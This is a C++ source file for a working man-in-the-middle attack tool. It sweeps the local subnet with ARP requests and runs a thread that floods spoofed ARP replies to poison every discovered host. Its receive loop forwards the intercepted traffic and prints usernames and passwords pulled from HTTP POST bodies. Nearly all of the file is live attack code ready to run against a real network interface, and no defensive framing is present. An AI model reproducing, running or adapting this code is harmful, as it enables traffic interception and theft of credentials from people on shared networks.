#include "mitm_attack.hpp"

// #define DEBUG 1
#define INFO 1

// Function to handle receiving ARP responses
void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, struct sockaddr_in gateway_ip, sockaddr_in &my_ip, sockaddr_ll &device) {
    uint8_t buffer[IP_MAXPACKET];
    struct sockaddr saddr;
    int saddr_len = sizeof(saddr);
    // Receive ARP responses
    printf("Available devices\n");
    printf("-----------------------------------------\n");
    printf("IP\t\t\tMAC\n");
    printf("-----------------------------------------\n");

    while (true) {
        // Receive packet
        int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
        if (bytes < 0) {
            perror("recvfrom() failed");
            exit(EXIT_FAILURE);
        }

        // Check if packet is an ARP packet
        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {
            arp_hdr *arphdr = (arp_hdr *)(buffer + ETH_HDRLEN);

            // Check if ARP packet is a response
            if (ntohs(arphdr->opcode) == ARPOP_REPLY) {
                // Save IP-MAC pair
                ip_mac_pairs[arphdr->sender_ip] = arphdr->sender_mac;

                // If the IP address is the gateway IP, continue
                if (arphdr->sender_ip[0] == (gateway_ip.sin_addr.s_addr & 0xff) &&
                    arphdr->sender_ip[1] == ((gateway_ip.sin_addr.s_addr >> 8) & 0xff) &&
                    arphdr->sender_ip[2] == ((gateway_ip.sin_addr.s_addr >> 16) & 0xff) &&
                    arphdr->sender_ip[3] == ((gateway_ip.sin_addr.s_addr >> 24) & 0xff)) {
                    continue;
                }

                // Print source IP address
                printf("%d.%d.%d.%d\t\t", arphdr->sender_ip[0], arphdr->sender_ip[1], arphdr->sender_ip[2], arphdr->sender_ip[3]);
                // Print source MAC address
                for (int i = 0; i < 5; i++) {
                    printf("%02x:", arphdr->sender_mac[i]);
                }
                printf("%02x\n", arphdr->sender_mac[5]);
            }
            continue;
        }
        // Check if packet is an ICMP packet
        if (bytes < ETH_HDRLEN + sizeof(struct iphdr)) {
            continue;  // Not enough data for IP header
        }
        struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
        // If the ip is loopback, continue
        if (iph->daddr == htonl(0x7f000001) || iph->saddr == htonl(0x7f000001)) {
            continue;
        }
        // Get the Ethernet header
        struct ethhdr *eth = (struct ethhdr *)buffer;

        bool modified = false;

        // Change the source MAC to my MAC
        memcpy(eth->h_source, my_mac.data(), ETH_ALEN);

        // If the destination IP is not in the map, change the destination MAC to the gateway's MAC
        if (ip_mac_pairs.find({(uint8_t)(iph->daddr & 0xff), (uint8_t)((iph->daddr >> 8) & 0xff), (uint8_t)((iph->daddr >> 16) & 0xff), (uint8_t)((iph->daddr >> 24) & 0xff)}) == ip_mac_pairs.end()) {
            // Find the MAC address for the gateway IP
            std::array<uint8_t, 4> gateway_ip_addr = {(uint8_t)(gateway_ip.sin_addr.s_addr & 0xff), (uint8_t)((gateway_ip.sin_addr.s_addr >> 8) & 0xff), (uint8_t)((gateway_ip.sin_addr.s_addr >> 16) & 0xff), (uint8_t)((gateway_ip.sin_addr.s_addr >> 24) & 0xff)};
            std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
            memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);
            modified = true;
        }
        // If the destination MAC is my_mac and the IP is not my IP, change the destination MAC to the IP's MAC
        if (memcmp(eth->h_dest, my_mac.data(), ETH_ALEN) != 0 && iph->daddr != my_ip.sin_addr.s_addr && !modified) {
            // Find the MAC address for the destination IP
            std::array<uint8_t, 4> dest_ip_addr;
            memcpy(dest_ip_addr.data(), &iph->daddr, 4);
            std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
            memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);
            modified = true;
        }

        // Check if packet is a TCP packet
        if (bytes < ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
            if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) <= 0) {
                perror("sendto() failed (CHECK TCP PACKET)");
                exit(EXIT_FAILURE);
            }
            continue;  // Not enough data for TCP header
        }
        // Get the payload
        uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
        int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));

        // Check if the payload is an HTTP POST packet
        const char *http_post = "POST";

        if (payload_length < strlen(http_post) || memcmp(payload, http_post, strlen(http_post)) != 0) {
            int chunk_size = 1024;  // Size of each chunk
            int total_sent = 0;     // Total amount of data sent
            while (total_sent < bytes) {
                int to_send = std::min(chunk_size, bytes - total_sent);
                if (sendto(sd, buffer + total_sent, to_send, 0, (struct sockaddr *)&device, sizeof(device)) <= 0) {
                    perror("sendto() failed (NOT HTTP POST PACKET)");
                    exit(EXIT_FAILURE);
                }
                total_sent += to_send;
            }

#ifdef DEBUG
            // If the source IP or the destination IP is 192.168.146.1, continue
            if (iph->saddr == htonl(0xc0a89201) || iph->daddr == htonl(0xc0a89201)) {
                continue;
            }
            // Print the source IP address
            printf("Source IP: %d.%d.%d.%d\t\t", iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
            // Print the source MAC address
            printf("Source MAC: ");
            for (int i = 0; i < 5; i++) {
                printf("%02x:", eth->h_source[i]);
            }
            printf("%02x\n", eth->h_source[5]);

            // Print the destination IP address
            printf("Destination IP: %d.%d.%d.%d\t\t", iph->daddr & 0xff, (iph->daddr >> 8) & 0xff, (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff);
            // Print the destination MAC address
            printf("Destination MAC: ");
            for (int i = 0; i < 5; i++) {
                printf("%02x:", eth->h_dest[i]);
            }
            printf("%02x\n", eth->h_dest[5]);
#endif
            continue;
        }

        // Find the username and password
        char *username_start = strstr((char *)payload, "Username=");
        char *password_start = strstr((char *)payload, "Password=");
        if (username_start && password_start) {
            char *username_end = strchr(username_start, '&');
            char *password_end = (char *)payload + payload_length;

            if (!username_end) {
                username_end = password_start - 1;
            }

            // Print the username and password
            printf("\nUsername: ");
            for (char *p = username_start + strlen("Username="); p < username_end; p++) {
                printf("%c", *p);
            }
            printf("\nPassword: ");
            for (char *p = password_start + strlen("Password="); p < password_end; p++) {
                printf("%c", *p);
            }
            printf("\n");
        }

        if (modified) {
            // Send the modified packet
            if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) <= 0) {
                perror("sendto() failed");
                exit(EXIT_FAILURE);
            }
        }
        memset(buffer, 0, IP_MAXPACKET);
    }
}

// Function to send fake ARP replies
void sendSpoofedARPReply(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, struct sockaddr_ll &device) {
    arp_hdr arphdr;
    arphdr.htype = htons(1);                    // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);             // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                            // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                            // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REPLY);         // OpCode: 2 for ARP reply
    int frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
    std::array<uint8_t, IP_MAXPACKET> ether_frame;

    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;
    while (true) {
        for (auto it_i = ip_mac_pairs.begin(); it_i != ip_mac_pairs.end(); ++it_i) {
            for (auto it_j = ip_mac_pairs.begin(); it_j != ip_mac_pairs.end(); ++it_j) {
                if (it_i == it_j) continue;  // Skip sending to self

                // Construct and send fake ARP reply
                std::copy(my_mac.begin(), my_mac.end(), arphdr.sender_mac.begin());              // Sender hardware address (48 bits): MAC address
                std::copy(it_j->first.begin(), it_j->first.end(), arphdr.sender_ip.begin());     // Sender protocol address (32 bits): IP of another pair
                std::copy(it_i->second.begin(), it_i->second.end(), arphdr.target_mac.begin());  // Target hardware address (48 bits): MAC address of current pair
                std::copy(it_i->first.begin(), it_i->first.end(), arphdr.target_ip.begin());     // Target protocol address (32 bits): IP of current pair

                // Destination and Source MAC addresses
                std::copy(it_i->second.begin(), it_i->second.end(), ether_frame.begin());
                std::copy(my_mac.begin(), my_mac.end(), ether_frame.begin() + 6);

                // ARP header
                memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));

                // Send ethernet frame to socket.
                if (sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&device, sizeof(device)) <= 0) {
                    perror("sendto() failed");
                    exit(EXIT_FAILURE);
                }

#ifdef DEBUG
                // Print fake ARP reply
                // printf("Fake ARP reply sent\n");
                // printf("Source IP: %d.%d.%d.%d\n", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);
                // printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.sender_mac[0], arphdr.sender_mac[1], arphdr.sender_mac[2], arphdr.sender_mac[3], arphdr.sender_mac[4], arphdr.sender_mac[5]);
                // printf("Target IP: %d.%d.%d.%d\n", arphdr.target_ip[0], arphdr.target_ip[1], arphdr.target_ip[2], arphdr.target_ip[3]);
                // printf("Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.target_mac[0], arphdr.target_mac[1], arphdr.target_mac[2], arphdr.target_mac[3], arphdr.target_mac[4], arphdr.target_mac[5]);
                // printf("-----------------------------------------\n");
#endif
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));  // Sleep for a while
    }
}


// Function to send ARP request
void sendARPRequest(int sd, struct LocalInfo local_info) {
    int frame_length;
    int bytes;
    arp_hdr arphdr;
    std::array<uint8_t, 6> dst_mac;
    std::array<uint8_t, IP_MAXPACKET> ether_frame;
    // Set destination MAC address: broadcast address
    std::fill(dst_mac.begin(), dst_mac.end(), 0xff);

    // Copy IP address from sockaddr_in to sender_ip
    std::copy_n(reinterpret_cast<uint8_t *>(&local_info.src_ip.sin_addr.s_addr), 4, arphdr.sender_ip.begin());

    // Fill out sockaddr_ll.
    local_info.device.sll_family = AF_PACKET;
    std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), local_info.device.sll_addr);
    local_info.device.sll_halen = htons(6);

    // ARP header
    arphdr.htype = htons(1);                                                                     // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);                                                              // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                                                                             // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                                                                             // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REQUEST);                                                        // OpCode: 1 for ARP request
    std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), arphdr.sender_mac.begin());  // Sender hardware address (48 bits): MAC address
    arphdr.target_mac.fill(0);                                                                   // Target hardware address (48 bits): zero

    // Fill out ethernet frame header.
    frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)

    // Destination and Source MAC addresses
    std::copy(dst_mac.begin(), dst_mac.end(), ether_frame.begin());
    std::copy(local_info.src_mac.begin(), local_info.src_mac.end(), ether_frame.begin() + 6);

    // Ethernet type code (ETH_P_ARP for ARP).
    // http://www.iana.org/assignments/ethernet-numbers
    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;
    uint32_t base_ip_net = ntohl(local_info.src_ip.sin_addr.s_addr) & ntohl(local_info.netmask.sin_addr.s_addr);
    uint32_t mask_net = ntohl(~local_info.netmask.sin_addr.s_addr);

    for (uint32_t i = 1; i < mask_net; i++) {
        uint32_t dest_ip = htonl(base_ip_net | i);

        std::copy_n(reinterpret_cast<uint8_t *>(&dest_ip), 4, arphdr.target_ip.begin());
        // ARP header
        memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));
        // Send ethernet frame to socket.
        if ((bytes = sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device))) <= 0) {
            perror("sendto() failed");
            exit(EXIT_FAILURE);
        }
    }
}

int main(int argc, char **argv) {
    char *interface;
    struct ifreq ifr;
    int sd;

    struct LocalInfo local_info;

    if (argc != 2) {
        printf("Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Interface to send packet through.
    interface = argv[1];

    // Get source IP address.
    get_src_IP(interface, local_info.src_ip);

    // Get source MAC address.
    get_mac_address(interface, local_info.src_mac);

    // Get netmask.
    get_netmask(interface, local_info.netmask);

    // Get default gateway.
    get_default_gateway(interface, local_info.gateway_ip);

    // Find interface index from interface name and store index in
    // struct sockaddr_ll device, which will be used as an argument of sendto().
    if ((local_info.device.sll_ifindex = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index");
        exit(EXIT_FAILURE);
    }
#ifdef INFO
    printf("src_ip: %s\n", inet_ntoa(local_info.src_ip.sin_addr));
    printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", local_info.src_mac[0], local_info.src_mac[1], local_info.src_mac[2], local_info.src_mac[3], local_info.src_mac[4], local_info.src_mac[5]);
    printf("netmask: %s\n", inet_ntoa(local_info.netmask.sin_addr));
    printf("Index for interface %s is %i\n", interface, local_info.device.sll_ifindex);
    printf("gateway_ip: %s\n", inet_ntoa(local_info.gateway_ip.sin_addr));
#endif

    // Submit request for a raw socket descriptor.
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    sendARPRequest(sd, local_info);

    // Use a table to save IP-MAC pairs
    std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;

    // Start the thread
    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info.src_mac, std::ref(local_info.device));

    // Receive responses
    receive_responses(sd, ip_mac_pairs, local_info.src_mac, local_info.gateway_ip, local_info.src_ip, local_info.device);

    // Wait for the thread to finish
    send_thread.join();

    // Close socket descriptor.
    close(sd);

    return (EXIT_SUCCESS);
}